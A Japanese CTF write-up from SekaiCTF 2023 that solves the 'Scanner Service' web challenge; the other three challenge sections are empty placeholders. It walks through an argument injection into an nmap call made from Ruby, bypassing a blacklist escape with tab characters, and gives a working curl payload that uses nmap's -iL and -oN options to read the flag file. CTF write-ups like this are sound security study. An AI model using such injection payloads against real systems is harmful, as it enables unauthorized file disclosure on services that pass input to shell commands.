# SekaiCTF 2023 Writeup {ignore=true}

SekaiCTF 2023（<https://ctftime.org/event/1923/>）に参加しました。  
土, 26 8月 2023, 01:00 JST — 月, 28 8月 2023, 01:00 JST

OnePaddingというチームで参加しましたが、問題が難しくて私は一問も解けなかったので、少しずつ復習します。

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=3 orderedList=false} -->

<!-- code_chunk_output -->

- [web/Scanner Service](#webscanner-service)
- [web/Frog-WAF](#webfrog-waf)
- [misc/I love this world](#misci-love-this-world)
- [misc/QR God](#miscqr-god)

<!-- /code_chunk_output -->

## web/Scanner Service

146 solves / 100 points

Rubyで書かれたアプリケーションで、入力した`ip:port`に対してnmapが実行される。

- src/app/controllers/scanner.rb

```rb:scanner.rb
<SNIP>
post '/' do
    input_service = escape_shell_input(params[:service])
    hostname, port = input_service.split ':', 2
    begin
      if valid_ip? hostname and valid_port? port
        # Service up?
        s = TCPSocket.new(hostname, port.to_i)
        s.close
        # Assuming valid ip and port, this should be fine
        @scan_result = IO.popen("nmap -p #{port} #{hostname}").read
      else
        @scan_result = "Invalid input detected, aborting scan!"
      end
    rescue Errno::ECONNREFUSED
      @scan_result = "Connection refused on #{hostname}:#{port}"
    rescue => e
      @scan_result = e.message
    end

    erb :'index'
  end
<SNIP>
```

また、入力値に対して、エスケープ処理及び正しいip、portの形式かを確認している。

- src/app/helper/scanner_helper.rb

```rb:scanner_helper.rb
def valid_port?(input)
  !input.nil? and (1..65535).cover?(input.to_i)
end

def valid_ip?(input)
  pattern = /\A((25[0-5]|2[0-4]\d|[01]?\d{1,2})\.){3}(25[0-5]|2[0-4]\d|[01]?\d{1,2})\z/
  !input.nil? and !!(input =~ pattern)
end

# chatgpt code :-)
def escape_shell_input(input_string)
  escaped_string = ''
  input_string.each_char do |c|
    case c
    when ' '
      escaped_string << '\\ '
    when '$'
      escaped_string << '\\$'
    when '`'
      escaped_string << '\\`'
    when '"'
      escaped_string << '\\"'
    when '\\'
      escaped_string << '\\\\'
    when '|'
      escaped_string << '\\|'
    when '&'
      escaped_string << '\\&'
    when ';'
      escaped_string << '\\;'
    when '<'
      escaped_string << '\\<'
    when '>'
      escaped_string << '\\>'
    when '('
      escaped_string << '\\('
    when ')'
      escaped_string << '\\)'
    when "'"
      escaped_string << '\\\''
    when "\n"
      escaped_string << '\\n'
    when "*"
      escaped_string << '\\*'
    else
      escaped_string << c
    end
  end

  escaped_string
end
```

正規表現でオクテットを見ているので、ipは正しい形式じゃないとダメそう。  
Rubyでは、input.to_iは先頭から数値部分のみを返すため、portは以下のような値でも通る。

```text
1337abcABC
```

後は、`nmap -p #{port} #{hostname}`のportにコマンドインジェクションするだけ。  
なのだが、使えそうなのは`=,/.!%09:+?%^[]~–`ここら辺のみ。（%09はタブ）

nmapのオプションを調べると、`-iL`でローカルのファイルを読み込むことができる。

- <https://nmap.org/book/man-briefoptions.html>

また、フラグファイルは`/flag-<32桁のランダム文字列>.txt`であるが、不明な文字は「?」を使うことで回避できる。（どこかのCTFでやってたのでこの挙動は知ってた。）
ローカルで実行すると、標準エラー出力ではあるが、ファイルの中身を出力することができる。

```bash
$ nmap -p 1337 -iL /flag-????????????????????????????????.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-29 13:11 UTC
Failed to resolve "SEKAI{7357_fl46}".
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.10 seconds
```

後は、標準エラー出力の内容を標準出力に出せれば解ける。
（競技中はここまでで手詰まり。）  
nmapのオプションには、`-oN`があり、`/dev/stdout`を使うことで標準出力に全て出力することができるらしい。

```bash
$ nmap -p 1337 -iL /flag-????????????????????????????????.txt -oN /dev/stdout 2>/dev/null
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-29 13:22 UTC
# Nmap 7.92 scan initiated Tue Aug 29 13:22:08 2023 as: nmap -p 1337 -iL /flag-2e025061da544fe4e70bae0d6658a0f4.txt -oN /dev/stdout
Failed to resolve "SEKAI{7357_fl46}".
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.02 seconds
# Nmap done at Tue Aug 29 13:22:08 2023 -- 0 IP addresses (0 hosts up) scanned in 0.02 seconds
```

- 解法

```bash
$ curl -X POST --data-binary 'service=127.0.0.1:1337%09-iL%09/flag-????????????????????????????????.txt%09-oN%09/dev/stdout' http://35.231.135.130:31759/ -s | grep SEKAI{
Failed to resolve "SEKAI{4r6um3n7_1nj3c710n_70_rc3!!}".
```

- 余談

`if`が使えれば、`if  [ 1 ];  then  echo  CONDITION;  fi`のも使えるかなと思ったが使えなかった。
`!!`のようにコマンドの実行履歴を使えないかと思ったが、そもそも複数コマンド実行できないとダメな気がする。

## web/Frog-WAF

29 solves / 413 points

// TODO

## misc/I love this world

166 solves / 100 points

// TODO

## misc/QR God

13 solves / 484 points

// TODO
